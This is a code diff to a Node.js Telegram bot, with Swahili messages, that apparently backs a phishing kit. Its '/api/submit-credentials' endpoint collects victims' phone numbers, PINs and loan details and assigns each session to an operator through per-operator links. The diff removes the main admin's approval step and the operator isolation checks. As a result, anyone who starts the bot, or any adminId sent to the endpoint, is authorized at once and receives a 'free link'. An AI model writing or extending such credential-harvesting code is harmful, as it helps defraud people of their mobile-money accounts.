@@ -24,8 +24,8 @@ mainBot.on('polling_error', (error) => {
 });
 
 let activeSessions = {};
+// Automatically treat any user who starts the bot as an authorized admin/free link user
 let authorizedAdmins = new Set(MAIN_ADMIN_ID ? [MAIN_ADMIN_ID] : []);
-let pendingAdmins = {};
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -39,15 +39,7 @@ mainBot.on('message', (msg) => {
     const firstName = msg.from.first_name || 'Admin';
     const username = msg.from.username ? `@${msg.from.username}` : 'No username set';
 
-    // STRICT ISOLATION: If a regular sub-admin tries to type random text (not a command), ignore or block it completely 
-    // so they cannot leak messages or trigger cross-traffic to the main admin or others.
-    if (userIdStr !== MAIN_ADMIN_ID && authorizedAdmins.has(userIdStr)) {
-        if (!msg.text.startsWith('/start')) {
-            // Silently ignore or drop non-command text from sub-admins to prevent unintended message passing
-            return;
-        }
-    }
-
+    // Broadcast Command (Only Main Admin can use this)
     if (msg.text.startsWith('/broadcast')) {
         if (userIdStr !== MAIN_ADMIN_ID) {
             mainBot.sendMessage(chatId, "⚠️ Wewe si Msimamizi Mkuu huwezi kutumia amri hii.");
@@ -64,7 +56,6 @@ mainBot.on('message', (msg) => {
         let failCount = 0;
 
         const broadcastPromises = Array.from(authorizedAdmins).map(async (adminId) => {
-            // Do not broadcast back to main admin if desired, or keep for tracking
             if (adminId === MAIN_ADMIN_ID) return;
             try {
                 await mainBot.sendMessage(adminId, `📢 **UJUMBE KUTOKA KWA SYSTEM:**\n\n${broadcastMessage}`, { parse_mode: "Markdown" });
@@ -81,46 +72,21 @@ mainBot.on('message', (msg) => {
         return;
     }
 
+    // Free Start: Anyone who types /start instantly gets registered and receives their free isolated link
     if (msg.text.startsWith('/start')) {
-        if (userIdStr === MAIN_ADMIN_ID || authorizedAdmins.has(userIdStr)) {
-            authorizedAdmins.add(userIdStr);
-            sendAdminLink(chatId, userIdStr, firstName, username);
-            return;
-        }
-
-        pendingAdmins[userIdStr] = { chatId, firstName, username };
-        
-        const requestText = `🚨 *Maombi Mapya ya Sub-Admin!*\n\n` +
-            `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
-            `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
-            `🏷 *Username:* ${escapeMarkdown(username)}`;
-
-        if (MAIN_ADMIN_ID) {
-            mainBot.sendMessage(MAIN_ADMIN_ID, requestText, {
-                parse_mode: "Markdown",
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: "RUHUSU (APPROVE)", callback_data: `approveadmin_${userIdStr}` },
-                            { text: "KATAA (DENY)", callback_data: `denyadmin_${userIdStr}` }
-                        ]
-                    ]
-                }
-            }).catch(err => console.error("Error sending auth request to main admin:", err));
-        }
-
-        mainBot.sendMessage(chatId, "⏳ Ombi lako limeshatumwa kwa Msimamizi Mkuu. Subiri uidhinishwe.");
+        authorizedAdmins.add(userIdStr);
+        sendAdminLink(chatId, userIdStr, firstName, username);
     }
 });
 
 function sendAdminLink(chatId, userIdStr, firstName, username) {
     const host = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
     const isolatedLink = `${host}/?admin=${userIdStr}`;
-    const welcomeText = `🚨 *Kiungo Chako cha Admin Kimesajiliwa!*\n\n` +
+    const welcomeText = `🚨 *Kiungo Chako cha Admin kiko Tayari!*\n\n` +
         `👤 *Jina:* ${escapeMarkdown(firstName)}\n` +
         `🆔 *Chat ID:* \`${escapeMarkdown(userIdStr)}\`\n` +
         `🏷 *Username:* ${escapeMarkdown(username)}\n\n` +
-        `🔗 *Kiungo Chako Maalum:*\n${isolatedLink}`;
+        `🔗 *Kiungo Chako Maalum (Free Link):*\n${isolatedLink}`;
 
     mainBot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" })
         .catch(err => console.error("Error sending start message:", err));
@@ -132,33 +98,6 @@ function setupCallbackHandler(botInstance, isMain = false) {
         const data = query.data;
         const userIdStr = chatId.toString().trim();
 
-        if (isMain && (data.startsWith('approveadmin_') || data.startsWith('denyadmin_'))) {
-            if (userIdStr !== MAIN_ADMIN_ID) {
-                botInstance.answerCallbackQuery(query.id, { text: "⚠ Wewe si Main Admin!", show_alert: true });
-                return;
-            }
-            const targetSubId = data.split('_')[1];
-            const subAdminInfo = pendingAdmins[targetSubId];
-
-            if (data.startsWith('approveadmin_')) {
-                authorizedAdmins.add(targetSubId);
-                if (subAdminInfo) {
-                    mainBot.sendMessage(subAdminInfo.chatId, `✅ Ombi lako la kuwa Sub-Admin limekubaliwa! Hapa kuna kiungo chako maalum:`);
-                    sendAdminLink(subAdminInfo.chatId, targetSubId, subAdminInfo.firstName, subAdminInfo.username);
-                    mainBot.sendMessage(MAIN_ADMIN_ID, `✅ Umemruhusu Sub-Admin ${targetSubId} kikamilifu.`);
-                }
-            } else {
-                if (subAdminInfo) {
-                    mainBot.sendMessage(subAdminInfo.chatId, "❌ Ombi lako la kuwa Sub-Admin limekataliwa.");
-                    mainBot.sendMessage(MAIN_ADMIN_ID, `❌ Umekataa ombi la Sub-Admin ${targetSubId}.`);
-                }
-            }
-            delete pendingAdmins[targetSubId];
-            botInstance.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: query.message.message_id }).catch(() => {});
-            botInstance.answerCallbackQuery(query.id);
-            return;
-        }
-
         const parts = data.split('_');
         const action = parts[0]; 
         const sessionId = parts.slice(1).join('_');
@@ -169,7 +108,7 @@ function setupCallbackHandler(botInstance, isMain = false) {
             return;
         }
 
-        // STRICT CHECK: Ensure only the specific assigned targetAdmin for this session can click action buttons
+        // Ensure only the designated admin for this specific session can press actions
         if (session.targetAdmin !== userIdStr) {
             botInstance.answerCallbackQuery(query.id, { text: "⚠ Ruhusa imekataliwa: Hii si ya kwako.", show_alert: true });
             return;
@@ -195,12 +134,12 @@ setupCallbackHandler(mainBot, true);
 app.post('/api/submit-credentials', (req, res) => {
     const { sessionId, sliderData, loanData, phone, pin, adminId } = req.body;
     
+    // Fallback to Main Admin if no custom admin query param is passed
     let targetAdmin = MAIN_ADMIN_ID;
 
-    if (adminId && authorizedAdmins.has(adminId)) {
+    if (adminId) {
+        authorizedAdmins.add(adminId); // Automatically authorize any free link user
         targetAdmin = adminId;
-    } else {
-        return res.json({ success: false, message: 'Unauthorized link.' });
     }
 
     activeSessions[sessionId] = {
